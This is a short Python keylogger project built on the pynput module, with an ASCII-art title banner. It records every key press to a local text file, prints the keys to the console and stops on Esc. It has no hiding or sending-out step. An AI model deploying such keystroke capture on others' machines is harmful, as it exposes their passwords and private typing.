# Keylogger using the pynput Module
print(''' 
 _____ _     _ _                _   _            
/  ___(_)   | | |              | | | |           
\ `--. _  __| | |__   __ _ _ __| |_| |__         
 `--. \ |/ _` | '_ \ / _` | '__| __| '_ \        
/\__/ / | (_| | | | | (_| | |  | |_| | | |       
\____/|_|\__,_|_| |_|\__,_|_|   \__|_| |_|       


 _   __           _                              
| | / /          | |                             
| |/ /  ___ _   _| | ___   __ _  __ _  ___ _ __  
|    \ / _ \ | | | |/ _ \ / _` |/ _` |/ _ \ '__| 
| |\  \  __/ |_| | | (_) | (_| | (_| |  __/ |    
\_| \_/\___|\__, |_|\___/ \__, |\__, |\___|_|    
             __/ |         __/ | __/ |           
            |___/         |___/ |___/            
______          _           _                    
| ___ \        (_)         | |                   
| |_/ / __ ___  _  ___  ___| |_                  
|  __/ '__/ _ \| |/ _ \/ __| __|                 
| |  | | | (_) | |  __/ (__| |_                  
\_|  |_|  \___/| |\___|\___|\__|                 
              _/ |                               
             |__/                                
''')

import pynput
from pynput.keyboard import Key, Listener

keys = []

# Pressing of a Key on the Keyboard

def on_press(key):
    keys.append(key)
    write_file(keys)

    try:
        print('Alphanumeric key {0} pressed'.format(key.char))

    except AttributeError:
        print('Special Key {0} Pressed'.format(key))


# Saving the Key pressed on te Keyboard

def write_file(keys):
    with open('KeysLOGGED.txt', 'w') as LOGGED:
        for key in keys:
            # removing ''
            k = str(key).replace("'", "")
            LOGGED.write(k)

            # every keystroke for readability
            LOGGED.write(' ')


# Releasing the key after being pressed

def on_release(key):
    print('{0} Released'.format(key))
    if key == Key.esc:
        # Stopping Listener
        return False

    # Noting the released key

with Listener(on_press=on_press,
              on_release=on_release) as listener:
        listener.join()
